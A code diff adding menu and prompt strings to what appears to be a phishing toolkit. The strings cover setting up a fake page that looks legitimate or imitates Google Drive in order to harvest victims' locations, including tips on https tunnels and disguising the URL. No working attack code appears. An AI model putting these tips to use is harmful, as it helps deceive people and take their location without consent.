@@ -54,7 +54,14 @@ lang_start_main_menu = {
     [ [_('{0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)'), _('{0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE)')]]
 
 
-
+}
+lang_start_phishing_page = {
+    "custom_folder_directory" : _('\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/{page}').format(default_palette[0], default_palette[4]),
+    "manual_reading_suggestion" : _('\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/{page}]').format(default_palette[0], default_palette[4]),
+    "press_enter_to_contunue_if_setup_correctly" : _('\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.').format(default_palette[0], default_palette[4]),
+    "copying_your_files" : _('\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...').format(default_palette[0], default_palette[4]),
+    "https_suggestion" : _("\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n").format(default_palette[0], default_palette[4]),
+    "gdrive_suggestion" : _('{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.').format(default_palette[0], default_palette[4])
 }
 
              
